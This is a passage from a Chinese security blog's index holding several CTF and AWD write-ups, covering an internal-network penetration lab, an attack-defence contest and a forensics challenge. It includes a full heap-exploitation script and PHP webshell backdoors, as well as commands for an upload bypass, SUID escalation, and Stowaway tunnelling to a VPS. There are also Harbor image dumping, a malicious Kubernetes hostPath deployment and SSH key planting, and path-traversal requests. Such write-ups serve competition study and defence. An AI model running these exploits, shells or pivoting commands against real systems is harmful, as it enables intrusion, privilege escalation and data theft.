mtu 1500 qdisc mq state UP group default qlen 1000\n    link/ether 00:16:3e:03:97:b8 brd ff:ff:ff:ff:ff:ff\n    inet 172.22.10.16/24 brd 172.22.10.255 scope global eth1\n       valid_lft forever preferred_lft forever\n    inet6 fe80::216:3eff:fe03:97b8/64 scope link \n       valid_lft forever preferred_lft forever\n```\n\n\n将fscan传到172.28.23.17后wget下载\n\n![](/img/内网/ichunqiu/GreatWall-22.png)\n\n172.22.10.1/24 网段存活如下\n\n```\n172.22.10.28\n```\n\n\n\n## 新翔OA (172.28.23.26)\n\n在之前的扫描结果中看到开放了21端口，匿名用户可以登录\n\n下载oa源码\n\n![](/img/内网/ichunqiu/GreatWall-8.png)\n\n开始审计代码\n\n从`main.php`开始，开头引入了`db.php`和`checklogin.php`\n\n抽象的鉴权\n\nchecklogin.php\n\n```php\n<?php\nfunction islogin(){\n   if(isset($_COOKIE['id'])&&isset($_COOKIE['loginname'])&&isset($_COOKIE['jueseid'])&&isset($_COOKIE['danweiid'])&&isset($_COOKIE['quanxian'])){\n\t   if($_COOKIE['id']!=''&&$_COOKIE['loginname']!=''&&$_COOKIE['jueseid']!=''&&$_COOKIE['danweiid']!=''&&$_COOKIE['quanxian']!=''){\n\t       return true;\n\t   }\n\t    else {\n\t      return false;\n\t   }\n    }\n    else {\n\t    return false;\n     }\n}\n?>\n```\n\n`Cookie: id=1;loginname=1;jueseid=1;danweiid=1;quanxian=1` 直接登录\n\n\n![](/img/内网/ichunqiu/GreatWall-9.png)\n\n\n登进去后好像没什么用，后台写的很简陋，没有功能点\n\n在源码根目录下还有一个`uploadbase64.php`\n\n```php\n<?php\n/**\n * Description: PhpStorm.\n * Author: yoby\n * DateTime: 2018/12/4 18:01\n * Email:logove@qq.com\n * Copyright Yoby版权所有\n */\n$img = $_POST['imgbase64'];\nif (preg_match('/^(data:\\s*image\\/(\\w+);base64,)/', $img, $result)) {\n    $type = \".\".$result[2];\n    $path = \"upload/\" . date(\"Y-m-d\") . \"-\" . uniqid() . $type;\n}\n$img =  base64_decode(str_replace($result[1], '', $img));\n@file_put_contents($path, $img);\nexit('{\"src\":\"'.$path.'\"}');\n```\n\n对于上传的校验不完整，只要符合格式是`data:image/xxx;base64,xxx`这种就行了\n\n\n![](/img/内网/ichunqiu/GreatWall-10.png)\n\n\n连上shell后发现有很多disable_functions\n\n```php\npcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,file_get_contents,readfile,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive,highlight_file,show_source,iconv,dl\n```\n\n用蚁剑自带的插件绕过即可\n\n![](/img/内网/ichunqiu/GreatWall-11.png)\n\n\n不过连接前需要修改下`.antproxy.php`中的`$url`，加一个`/upload`\n\n\n然后就可以执行命令来提权了\n\n执行`find / -perm -u=s -type f 2>/dev/null`，发现`base32`有suid权限，可以利用\n\n```bash\n/bin/fusermount\n/bin/ping6\n/bin/mount\n/bin/su\n/bin/ping\n/bin/umount\n/usr/bin/chfn\n/usr/bin/newgrp\n/usr/bin/gpasswd\n/usr/bin/at\n/usr/bin/staprun\n/usr/bin/base32\n/usr/bin/passwd\n/usr/bin/chsh\n/usr/bin/sudo\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/s-nail/s-nail-privsep\n```\n\n![](/img/内网/ichunqiu/GreatWall-12.png)\n\n\n查看网卡情况\n\n```bash\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host \n       valid_lft forever preferred_lft forever\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    link/ether 00:16:3e:01:54:82 brd ff:ff:ff:ff:ff:ff\n    inet 172.28.23.26/16 brd 172.28.255.255 scope global eth0\n       valid_lft forever preferred_lft forever\n    inet6 fe80::216:3eff:fe01:5482/64 scope link \n       valid_lft forever preferred_lft forever\n3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    link/ether 00:16:3e:01:a4:5e brd ff:ff:ff:ff:ff:ff\n    inet 172.22.14.6/16 brd 172.22.255.255 scope global eth1\n       valid_lft forever preferred_lft forever\n    inet6 fe80::216:3eff:fe01:a45e/64 scope link \n       valid_lft forever preferred_lft forever\n```\n\n\n同样的wget下载fscan\n\n`http://172.28.23.26/upload/.antproxy.php?a=system(\"wget http://172.28.23.17:8080/fscan\");`\n\n\n然后反弹到thinkphp里执行\n\n![](/img/内网/ichunqiu/GreatWall-13.png)\n\n\n172.22.14.1/24 网段存活如下\n\n```\n172.22.14.37\n172.22.14.46\n```\n\n\n\n# 第二层内网\n\n## 建立代理\n\n使用`Stowaway`将内网主机多层代理出来\n\n1：vps上作为管理端\n`./linux_x64_admin -l 2223 -s 2223`\n\n2：ThinkPHP (172.28.23.17) 作为跳板\n`./linux_x64_agent -c 47.99.77.52:2223 -s 2223 --reconnect 8`\n\n3：控制端监听端口\n```bash\n(admin) >> use 0\n(node 0) >> listen\n[*] BE AWARE! If you choose IPTables Reuse or SOReuse,you MUST CONFIRM that the node you're controlling was started in the corresponding way!\n[*] When you choose IPTables Reuse or SOReuse, the node will use the initial config(when node started) to reuse port!\n[*] Please choose the mode(1.Normal passive/2.IPTables Reuse/3.SOReuse): 1\n[*] Please input the [ip:]<port> : 8889\n[*] Waiting for response......\n[*] Node is listening on 8889\n```\n\n4：新翔OA (172.28.23.26)连接到ThinkPHP (172.28.23.17)\n`./linux_x64_agent -c 172.28.23.17:8889 -s 2223 --reconnect 8`\n\n\n5：然后就可以建立socks代理了\n```bash\n(node 0) >> socks 7878\n[*] Trying to listen on 0.0.0.0:7878......\n[*] Waiting for agent's response......\n[*] Socks start successfully!\n```\n\n\n## Harbor (172.22.14.46)\n\n尝试打[harbor未授权](https://github.com/404tk/CVE-2022-46463)\n\n![](/img/内网/ichunqiu/GreatWall-14.png)\n\n下载secret镜像\n\n`python harbor.py http://172.22.14.46/ --dump harbor/secret -v2`\n\n得到flag5\n\n![](/img/内网/ichunqiu/GreatWall-15.png)\n\n\n## DooTask (172.22.10.28)\n\n下载projectadmin镜像\n\n`python harbor.py http://172.22.14.46/ --dump project/projectadmin -v2`\n\nrun.sh\n\n```bash\n#!/bin/bash\nsleep 1\n\n# start\njava -jar /app/ProjectAdmin-0.0.1-SNAPSHOT.jar\n/usr/bin/tail -f /dev/null\n```\n\n找到`ProjectAdmin-0.0.1-SNAPSHOT.jar`然后反编译\n\n泄露了数据库账号密码\n\n```java\nspring.datasource.url=jdbc:mysql://172.22.10.28:3306/projectadmin?characterEncoding=utf-8&useUnicode=true&serverTimezone=UTC\nspring.datasource.username=root\nspring.datasource.password=My3q1i4oZkJm3\nspring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver\n\nmybatis.type-aliases-package=com.smartlink.projectadmin.entity\nmybatis.mapper-locations=classpath:mybatis/mapper/*.xml\n```\n\n![](/img/内网/ichunqiu/GreatWall-16.png)\n\n直接用MDUT一把梭\n\n![](/img/内网/ichunqiu/GreatWall-17.png)\n\n\n## k8s (172.22.14.37)\n\nfscan扫到了10250端口，这个端口有个`k8s kubelet 10250端口未授权`，但是不符合利用条件\n\n尝试另一个6443端口的Api Server未授权\n\n![](/img/内网/ichunqiu/GreatWall-21.png)\n\n\n编辑恶意yaml\n\n```yaml\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\n  labels:\n    app: nginx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.8\n        volumeMounts:\n        - mountPath: /mnt\n          name: test-volume\n      volumes:\n      - name: test-volume\n        hostPath:\n          path: /\n```\n\n创建pod\n\n`kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/  apply -f evil.yaml`\n\n\n列出pod\n\n`kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ get pods -n default`\n\n![](/img/内网/ichunqiu/GreatWall-18.png)\n\n\n进容器\n\n`kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ exec -it nginx-deployment-864f8bfd6f-zfgqd /bin/bash`\n\n\n写公钥\n\n`echo \"ssh-rsa xxxx\" > /mnt/root/.ssh/authorized_keys`\n\n\nssh连接，在数据库中得到flag\n\n![](/img/内网/ichunqiu/GreatWall-19.png)\n\n\n![](/img/内网/ichunqiu/GreatWall-20.png)\n\n\n\n# 拓扑图\n\n大概绘制的拓扑图\n\n![](/img/内网/ichunqiu/GreatWall-23.png)\n","tags":["内网渗透","春秋云境","多维挑战"],"categories":["内网渗透"]},{"title":"2024宁波市第七届网络安全大赛决赛 awd wp","url":"/posts/20b347fd/","content":"\n\n# pwn\n\n**攻击**\n\n```python\nfrom pwn import *\ncontext.arch='amd64'\nimport sys\ndef add(ind,size,data=b'\\n'):\n    p.sendlineafter(b'edit',b'1')\n    p.sendlineafter(b'size',str(size).encode())\n    p.sendlineafter(b'index',str(ind).encode())\n    p.sendafter(b'content',data)\n\ndef free(ind):\n    p.sendlineafter(b'edit',b'2')\n    p.sendlineafter(b'index',str(ind).encode())\ndef show(ind):\n    p.sendlineafter(b'edit',b'3')\n    p.sendlineafter(b'index\\n',str(ind).encode())\ndef edit(ind,data):\n    p.sendlineafter(b'edit',b'4')\n    p.sendlineafter(b'index',str(ind).encode())\n    p.sendafter(b'content',data)\n\np=remote(sys.argv[1],sys.argv[2],timeout=2)\n#p=process(\"./pwn\")\nlibc=ELF(\"./libc-2.27.so\")\np.sendlineafter(b'name',b'rotwill')\n#gdb.attach(p,'b mprotect\\nc')\nadd(0,0x500)\nadd(1,0x50)\nadd(2,0x50)\nadd(3,0x50)\nfree(0)\nshow(0)\nd=u64(p.read(6).ljust(8,b'\\x00'))\nlibc.address=d-0x60-0x10-libc.sym['__malloc_hook']\nfree_hook=libc.sym['__free_hook']\nsetcontext=libc.address+0x52085\nmprotect=libc.sym['mprotect']\nfree(1)\nfree(2)\nshow(2)\nd=u64(p.read(6).ljust(8,b'\\x00'))\nchunk1=d\nedit(2,p64(free_hook))\nchunk6=chunk1-0x500-0x10\npayload=flat({\n    0:chunk6+0x100,\n    0x68: chunk6&(~0xfff),\n    0x70: 0x1000,\n    0x88: 0x7,\n    0xa0:chunk6,\n    0xa8: mprotect\n    },filler=b'\\x00')\npayload=payload.ljust(0x100,b'\\x00')\nshellcode=shellcraft.open('flag')+shellcraft.read(3,chunk6,0x40)+\\\n            shellcraft.write(1,chunk6,0x40)\npayload+=asm(shellcode)\nadd(6,0x500,payload)\n\nadd(4,0x50)\nadd(5,0x50,p64(setcontext))\nfree(6)\np.readuntil(b\"flag{\")\n\nprint(b'flag{'+p.readuntil(b'}'))\n\np.close()\n```\n\n**修复**\n\n![](/img/awd/2024nb-1.png)\n\n\n将触发free函数的操作改为清空对应chunk指针即可\n\n然后导出替换\n\n`cat /tmp/pwn1 > /home/ctf/pwn`\n\n\n# web\n\n\n## 漏洞1-默认后门\n\n用D盾直接扫可以扫到两个默认后门\n\n![](/img/awd/2024nb-2.png)\n\n`public/test.php`\n\n```php\n<?php if(isset($_REQUEST[\"cmd\"])){ echo \"<pre>\"; $cmd = ($_REQUEST[\"cmd\"]); system($cmd); echo \"</pre>\"; die; }?>\n```\n\n![](/img/awd/2024nb-3.png)\n\n**修复**\n\n直接删掉\n\n\n## 漏洞2-默认后门\n\n`public/upload/other/20240513/hack.php`\n\n```php\n<?php @eval($_POST['cmd']); ?>\n```\n\n![](/img/awd/2024nb-4.png)\n\n\n**修复**\n\n直接删掉\n\n\n\n## 漏洞3-任意文件上传\n\n`public/hint.txt`得到管理员账号密码\n\n```text\n测试账号\n\n账号:ADMIN1\n密码:mypassword\n```\n\n通过`.env`可知后台地址映射为`oka_admin`\n\n![](/img/awd/2024nb-7.png)\n\n\n登录后台后发现在上传头像处没有过滤，可以直接上传\n\n\n![](/img/awd/2024nb-8.png)\n\n\n可惜这个点不是未授权，批量利用比较麻烦\n\n\n**修复**\n\n1：修改密码，后台没找到修改密码的地方，需要进入数据库修改\n\n2：增加白名单\n\n`app/admin/controller/File.php`\n\n```php\n    /**\n     * 支持上传大文件\n     */\n    public function upload()\n    {\n        $input        = input('post.');\n        $uploadPath   = public_path().'upload/';\n        $uploadFile   = $this->request->file('file');\n        $originalName = $uploadFile->getOriginalName();\n        $originalType = FileAddons::getType(config('upload.ext'),  $originalName);\n        $chunkId      = empty($input['id']) ? md5(sha1_file($uploadFile).$input['size']) : $input['id'];\n        $chunkIndex   = $input['index'];\n        $chunkCount   = $input['count'];\n        $chunkPath    = 'chunk/'.$chunkId.'/';\n\n\n        // 增加的代码\n        $extension = strtolower($uploadFile->getOriginalExtension());\n        $allowedExtensions = ['jpg', 'jpeg', 'png', 'gif'];\n        if (!in_array($extension, $allowedExtensions)) {\n            throw new ValidateException('只允许上传图片文件');\n        }\n\n\n        if (empty($originalType)) {\n            return json(['status' => 'error', 'message' => '类型不支持，在常规管理中可配置！']);\n        }\n        try {\n            validate([ 'file' => ['fileSize' => config('upload.size')[$originalType], 'fileExt' => config('upload.ext')[$originalType]] ])->check(['file' => $uploadFile]);\n        } catch (ValidateException $e) {\n            return json(['status' => 'error', 'message' => $e->getMessage()]);\n        }\n        // 断点续传\n        if ($chunkIndex == 1) {\n            if (is_dir($uploadPath . $chunkPath)) {\n               $oldChunkIndex = count(scandir($uploadPath . $chunkPath)) - 3; \n               if ($oldChunkIndex > 1) {\n                    return json(['status' => 'success', 'message' => '断点续传', 'index' => $oldChunkIndex, 'id' => $chunkId]);\n                }\n            }\n        }\n        // 分片写入\n        Filesystem::disk('public')->putFileAs($chunkPath, $uploadFile, $chunkIndex . '.tmp');\n        if ($chunkIndex < $chunkCount) {\n            return json(['status' => 'success', 'message' => '分片上传', 'index' => $chunkIndex, 'id' => $chunkId]);\n        }\n        // 分片检查\n        for ($i = 1; $i <= $chunkCount; $i++) {\n            if (! file_exists($uploadPath . $chunkPath . $i . '.tmp')) {\n                return json(['status' => 'error', 'message' => '文件损坏，请重新上传']); \n            }\n        }\n        // 分片合并\n        $filePath = $uploadPath . $originalType . '/' . date('Ymd')  . '/';\n        if (! is_dir($filePath)) {\n            mkdir($filePath, 0777, true);\n        }\n        $fileExt   = $uploadFile->getOriginalExtension() ? $uploadFile->getOriginalExtension() : substr(strrchr($originalName, '.'), 1);\n        $fileName  = md5(microtime(true) . $originalName) . '.' . $fileExt;\n        $fileWrite = @fopen($filePath . $fileName, \"wb\");\n        if (flock($fileWrite, LOCK_EX)) {\n            for ($i = 1; $i <= $chunkCount; $i++) {\n                $uploadFile = $uploadPath . $chunkPath . $i . '.tmp';\n                if (!$handle = @fopen($uploadFile, \"rb\")) {\n                    break;\n                }\n                while ($buff = fread($handle, filesize($uploadFile))) {\n                    fwrite($fileWrite, $buff);\n                }\n                @fclose($handle);\n                @unlink($uploadFile); //删除分片\n            }\n            flock($fileWrite, LOCK_UN);\n        }\n        @fclose($fileWrite);\n        // 存入数据库\n        $save = FileModel::create([\n            'title'       => $originalName,\n            'type'        => $originalType,\n            'size'        => $input['size'],\n            'url'         => str_replace(public_path(), '/', $filePath . $fileName),\n            'status'      => 1,\n            'theme'       => theme(),\n            'create_time' => $input['create_time'],\n        ]);\n        // 图片处理\n        if ($originalType === \"image\" && $fileExt != 'ico' && $fileExt != 'gif') {\n            // 封面图片\n            thumbnail($save['url'],100,100);\n            // 水印图片\n            $watermark = $this->request->watermark;\n            if (! empty($watermark)) {\n                if ($watermark['open'] === 1) {\n                    // 水印图片\n                    $watermarkConfig = $this->request->watermark;\n                    if (!empty($watermarkConfig)) {\n                        if ($watermarkConfig['open'] === 1) {\n                            $file     = str_replace('\\/', '/', public_path() . $save->url);\n                            $image    = Image::open($file);\n                            $scale    = (int)$watermarkConfig['scale'] / 100;\n                            $position = (int)$watermarkConfig['position'];\n                            $opacity  = (int)$watermarkConfig['opacity'];\n                            $height   = $image->height();\n                            $width    = $image->width(); \n                            if ($watermarkConfig['type'] === 'image') {\n                                $water = public_path() . 'upload/watermark.png';\n                                if (is_file($water)) {\n                                    if ($watermarkConfig['sizeType'] === 'scale') {\n                                        // 按照比例\n                                        $thumb = Image::open($water);\n                                        $waterName  = pathinfo($save->url, PATHINFO_FILENAME);\n                                        $waterThumb = str_replace('watermark', 'watermark_thumb', $water);\n                                        $thumb->thumb($width*$scale, $height*$scale)->save($waterThumb);\n                                        $image->water($waterThumb, $position, $opacity)->save($file);\n                                        if (is_file($waterThumb)) {\n                                            unlink($waterThumb);\n                                        }\n                                    } else {\n                                        // 按实际大小\n                                        $image->water($water, $position, $opacity)->save($file);\n                                    }\n                                }\n                            } else {\n                                $opacity    = 127 - (127 * $opacity / 100);\n                                $dechex     = dechex($opacity);\n                                $fontColor  = $watermarkConfig['fontColor'].$dechex;\n                                $fontSize   = $watermarkConfig['sizeType'] === 'scale' ? $scale * ($width/2) : $watermarkConfig['fontSize'];\n                                $fontFamily = public_path() . $watermarkConfig['fontFamily'];\n                                $image->text($watermarkConfig['fontText'], $fontFamily, $fontSize, $fontColor, $position, 0, $watermarkConfig['fontAngle'])->save($file);\n                            }\n                        }\n                    }\n                }\n            }\n        }\n        // 上传结束钩子\n        event('UploadEnd', $save);\n        return json(['status' => 'success', 'message' => '上传成功', 'data' => $save]);\n    }\n```\n\n\n![](/img/awd/2024nb-9.png)\n\n\n\n## 漏洞4-任意文件读取\n\n在修漏洞3-任意文件上传的时候看到就在上传文件的代码的上面几行就是一个下载函数，没有任何过滤，可以直接利用\n\n`app/admin/controller/File.php`\n\n```php\n    /**\n     * 下载文件\n     */\n    public function download()\n    {\n        $input = input();\n        return download(public_path() . $input['url'], $input['title']);\n    }\n```\n\n`/oka_admin/file/download?url=../../../../../../flag&title=1.txt`\n\n![](/img/awd/2024nb-10.png)\n\n\n**修复**\n\n```php\n    /**\n     * 下载文件\n     */\n    public function download()\n    {\n        $input = input();\n\n        $input = str_replace(\"flag\",\"\",$input);\n        $input = str_replace(\"../\",\"\",$input);\n\n        return download(public_path() . $input['url'], $input['title']);\n    }\n```\n\n或者\n\n```php\n    /**\n     * 下载文件\n     */\n    public function download()\n    {\n        $input = input();\n\n        if(strpos($input['url'],'flag')!==false){\n            throw new Exception(\"No No\");\n        }\n\n        return download(public_path() . $input['url'], $input['title']);\n    }\n```\n\n\n## 漏洞5-rce\n\n审计发现`public/themes/template/404.html`包含恶意代码\n\n```php\n<?php\nif(isset($_GET['a'], $_GET['aa'], $_GET['b'], $_GET['bb'], $_GET['c'])) {\n  $a = $_GET['a'];\n  $aa = $_GET['aa'];\n  $b = $_GET['b'];\n  $bb = $_GET['bb'];\n  $c = $_GET['c'];\n  ((new $a($aa))->$c())((new $b($bb))->$c());\n} else {\n  echo '';\n}\n?>\n```\n\n![](/img/awd/2024nb-5.png)\n\n\n访问任意不存在的文件使得404.html被包含即可通过Error内置类进行rce\n\n![](/img/awd/2024nb-6.png)\n\n\n**修复**\n\n直接删掉这段代码\n\n\n# 其他\n\n1：web靶机从第二轮开始基本所有队伍都上了通防，基本全靠pwn拿分了（偶尔会有几个web重置可以拿分）\n2：网络环境很差，有的靶机访问特别慢\n3：大概第四第五轮开始ssh中断，一直到结束前四十分钟才恢复\n4：没与工作人员说明的情况下靶机被重置多次（好像很多队伍都被重置了。但是重置后ssh密码也被更改了，赛后才知道是123456）\n5：大量靶机没有flag（可能有队伍提权了，不过猜测大概率是因为ssh连不上导致写不进flag）\n6：flag提交的api接口有问题（例子：交了10个flag，全部显示flag错误，但是会加分）\n\n\n![哈哈哈哈](/img/awd/2024nb-11.png)","tags":["awd","wp","宁波"],"categories":["wp"]},{"title":"第一届长城杯信息安全铁人三项赛决赛 取证溯源 wp","url":"/posts/8ba5208d/","content":"\n# 取证溯源\n\n>1、您的同事李白在运维一台部署了移动应用服务端的linux服务器时发现了异常，好像被黑客攻击了。小李通过简单分析，发现可能是由于公司的移动应用和其服务端程序都存在安全问题导致的。小李将当天可能与攻击相关的流量导出，并与移动应用一起打包压缩，你可以下载分析，也可以登录此服务器进行攻击溯源、排查等，提供了SSH和VNC访问的方式供您和您的团队进行分析取证。\n\n\n## 关卡01： 100 分\n\n>关卡描述：黑客攻击此服务器所使用的2个IP分别是什么（ascii码从小到大排列，空格分隔）\n\n\n流量包得到第一个攻击ip\n\n![](/img/wp/2024/2024ccb-quzheng-2.png)\n\n在定时反弹的邮件中得到另一个ip\n\n![](/img/wp/2024/2024ccb-quzheng-1.png)\n\n\n`202.1.1.1 202.1.1.129`\n\n\n## 关卡02： 50 分\n\n>关卡描述：存在安全问题的apk中使用的登录密码是什么?\n\njadx打开搜索`password`\n\n\n![](/img/wp/2024/2024ccb-quzheng-3.png)\n\n\n`password663399`\n\n\n## 关卡03： 50 分\n\n>关卡描述：黑客尝试上传一个文件但显示无上传权限的文件名是什么？\n\n在流量包中搜索\n\n![](/img/wp/2024/2024ccb-quzheng-4.png)\n\n`pic.jpg`\n\n\n## 关卡04： 150 分\n\n>关卡描述：黑客利用的漏洞接口的api地址是什么?（http://xxxx/xx)\n\n找到上传成功的那个包即可\n\n![](/img/wp/2024/2024ccb-quzheng-5.png)\n\n`http://202.1.1.66:8080/api/upload`\n\n\n## 关卡05： 150 分\n\n>关卡描述：黑客上传的webshell绝对路径是什么？\n\n连上靶机，找到tomcat根目录，然后根据上一题的访问路径找到shell\n\n![](/img/wp/2024/2024ccb-quzheng-6.png)\n\n`/usr/local/tomcat/webapps/ROOT/static/s74e7vwmzs21d5x6.jsp`\n\n\n## 关卡06： 150 分\n\n>关卡描述：黑客上传的webshell的密码是什么？\n\n分析上上题的代码\n\n![](/img/wp/2024/2024ccb-quzheng-7.png)\n\n`bing_pass`\n\n\n## 关卡07： 200 分\n\n>关卡描述：黑客通过webshell执行的第一条命令是什么？\n\n筛选访问`/static/s74e7vwmzs21d5x6.jsp`的流量\n\n第一个包是冰蝎的状态检测，所以应该看第二个包\n\n密钥是`b99f657b04941030`\n\n![](/img/wp/2024/2024ccb-quzheng-10.png)\n\n解aes后反编译\n\n![](/img/wp/2024/2024ccb-quzheng-8.png)\n\n\n`pwd`\n\n\n\n## 关卡08： 150 分\n\n>关卡描述：黑客获取webshell时查询当前shell的权限是什么？\n\n继续跟`/static/s74e7vwmzs21d5x6.jsp`的流量\n\n找到执行`whoami`的\n\n![](/img/wp/2024/2024ccb-quzheng-11.png)\n\n拿返回值解密aes，再解base64\n\n![](/img/wp/2024/2024ccb-quzheng-9.png)\n\n`tomcat`\n\n\n\n## 关卡09： 150 分\n\n>关卡描述：利用webshell查询服务器Linux系统发行版本是什么？\n\n\n步骤和上一题一样\n\n有一个包执行了`cat /etc/redhat-release`，找返回值解密即可\n\n![](/img/wp/2024/2024ccb-quzheng-12.png)\n\n`CentOS Linux release 7.4.1708 (Core)`\n\n\n\n## 关卡10： 50 分\n\n>关卡描述：黑客从服务器上下载的秘密文件的绝对路径是什么？\n\nshell同目录下可以看到`secert.file`\n\n![](/img/wp/2024/2024ccb-quzheng-13.png)\n\n`/usr/local/tomcat/webapps/ROOT/static/secert.file`\n\n\n\n## 关卡11： 50 分\n\n>关卡描述：黑客通过反连执行的第一条命令是什么？\n\n找到反弹shell的地址`202.1.1.129:4444`\n\n![](/img/wp/2024/2024ccb-quzheng-14.png)\n\n在流量包中筛选4444端口，然后追踪流\n\n![](/img/wp/2024/2024ccb-quzheng-15.png)\n\n`cat /etc/passwd`\n\n\n## 关卡12： 50 分\n\n>关卡描述：黑客通过什么文件修改的root密码（绝对路径）\n\n图片同上\n\n`/etc/passwd`\n\n\n## 关卡13： 250 分\n\n>关卡描述：黑客设置的root密码是多少？\n\n爆破上上图中的hash\n\n![](/img/wp/2024/2024ccb-quzheng-16.png)\n\n`123456`\n\n\n## 关卡14： 50 分\n\n>关卡描述：黑客留下后门的反连的ip和port是什么？（ip:port)\n\n查看定时任务\n\n![](/img/wp/2024/2024ccb-quzheng-17.png)\n\n`202.1.1.129:9999`\n\n\n## 关卡15： 150 分\n\n>关卡描述：黑客通过后门反连执行的第一条命令是什么？\n\n流量过滤9999单端口\n\n![](/img/wp/2024/2024ccb-quzheng-18.png)\n\n`rpm -qa | grep pam`\n\n\n## 关卡16： 200 分\n\n>关卡描述：黑客通过什么文件留下了后门？\n\n根据上一题的命令去搜索pam相关文件\n\n找到`/usr/lib/security/pam_unix.so`和`/usr/lib64/security/pam_unix.so`\n\n存在后门\n\n![](/img/wp/2024/2024ccb-quzheng-19.png)\n\n\n`pam_unix.so`\n\n\n## 关卡17： 300 分\n\n>关卡描述：黑客设置的后门密码是什么？\n\n继续往下走，直接看到密码\n\n![](/img/wp/2024/2024ccb-quzheng-20.png)\n\n`ssh_back_pwd`\n\n\n## 关卡18： 250 分\n\n>关卡描述：黑客的后门将root密码记录在哪个文件中？（绝对路径）\n\n继续向下\n\n![](/img/wp/2024/2024ccb-quzheng-21.png)\n\n`/tmp/.sshlog`","tags":["wp","长城杯","2024竞赛"],"categories":["wp"]},{"title":"第十七届全国大学生信息安全竞赛-创新实践能力赛初赛","url":"/posts/19d58d81/","content":"\n\n# misc\n\n## Power Trajectory Diagram\n\n先将npz解压，然后将功耗转成图片分析\n\n```python\nfrom PIL import Image\nimport numpy as np\nind=np.load(\"index.npy\")\np=np.load(\"trace.npy\")\n\nfor j,a in enumerate(p):\n    img=Image.new(\"1\",(5000,300),255)\n    for i,v in enumerate(a):\n        img.putpixel((i,int(v*100)+150),0)\n    img.save(\"output/%s.png\"%j)\n```\n\n将四十张图片一组，找到不同的图片，然后在输入的表中找到索引\n\n```python\nimport numpy as np\n\n# 读取数组\nprint(np.load('input.npy'))\n'''\n['a' 'b' 'c' 'd' 'e' 'f' 'g' 'h' 'i' 'j' 'k' 'l' 'm' 'n' 'o' 'p' 'q' 'r'\n 's' 't' 'u' 'v' 'w' 'x' 'y' 'z' '0' '1' '2' '3' '4' '5' '6' '7' '8' '9'\n '_' '!' '@' '#' 'a' 'b' 'c' 'd' 'e' 'f' 'g' 'h' 'i' 'j' 'k' 'l' 'm' 'n'\n 'o' 'p' 'q' 'r' 's' 't' 'u' 'v' 'w' 'x' 'y' 'z' '0' '1' '2' '3' '4' '5'\n '6' '7' '8' '9' '_' '!' '@' '#' 'a' 'b' 'c' 'd' 'e' 'f' 'g' 'h' 'i' 'j'\n 'k' 'l' 'm' 'n' 'o' 'p' 'q' 'r' 's' 't' 'u' 'v' 'w' 'x' 'y' 'z' '0' '1'\n '2' '3' '4' '5' '6' '7' '8' '9' '_' '!' '@' '#' 'a' 'b' 'c' 'd' 'e' 'f'\n 'g' 'h' 'i' 'j' 'k' 'l' 'm' 'n' 'o' 'p' 'q' 'r' 's' 't' 'u' 'v' 'w' 'x'\n 'y' 'z' '0' '1' '2' '3' '4' '5' '6' '7' '8' '9' '_' '!' '@' '#' 'a' 'b'\n 'c' 'd' 'e' 'f' 'g' 'h' 'i' 'j' 'k' 'l' 'm' 'n' 'o' 'p' 'q' 'r' 's' 't'\n 'u' 'v' 'w' 'x' 'y' 'z' '0' '1' '2' '3' '4' '5' '6' '7' '8' '9' '_' '!'\n '@' '#' 'a' 'b' 'c' 'd' 'e' 'f' 'g' 'h' 'i' 'j' 'k' 'l' 'm' 'n' 'o' 'p'\n 'q' 'r' 's' 't' 'u' 'v' 'w' 'x' 'y' 'z' '0' '1' '2' '3' '4' '5' '6' '7'\n '8' '9' '_' '!' '@' '#' 'a' 'b' 'c' 'd' 'e' 'f' 'g' 'h' 'i' 'j' 'k' 'l'\n 'm' 'n' 'o' 'p' 'q' 'r' 's' 't' 'u' 'v' 'w' 'x' 'y' 'z' '0' '1' '2' '3'\n '4' '5' '6' '7' '8' '9' '_' '!' '@' '#' 'a' 'b' 'c' 'd' 'e' 'f' 'g' 'h'\n 'i' 'j' 'k' 'l' 'm' 'n' 'o' 'p' 'q' 'r' 's' 't' 'u' 'v' 'w' 'x' 'y' 'z'\n '0' '1' '2' '3' '4' '5' '6' '7' '8' '9' '_' '!' '@' '#' 'a' 'b' 'c' 'd'\n 'e' 'f' 'g' 'h' 'i' 'j' 'k' 'l' 'm' 'n' 'o' 'p' 'q' 'r' 's' 't' 'u' 'v'\n 'w' 'x' 'y' 'z' '0' '1' '2' '3' '4' '5' '6' '7' '8' '9' '_' '!' '@' '#'\n 'a' 'b' 'c' 'd' 'e' 'f' 'g' 'h' 'i' 'j' 'k' 'l' 'm' 'n' 'o' 'p' 'q' 'r'\n 's' 't' 'u' 'v' 'w' 'x' 'y' 'z' '0' '1' '2' '3' '4' '5' '6' '7' '8' '9'\n '_' '!' '@' '#' 'a' 'b' 'c' 'd' 'e' 'f' 'g' 'h' 'i' 'j' 'k' 'l' 'm' 'n'\n 'o' 'p' 'q' 'r' 's' 't' 'u' 'v' 'w' 'x' 'y' 'z' '0' '1' '2' '3' '4' 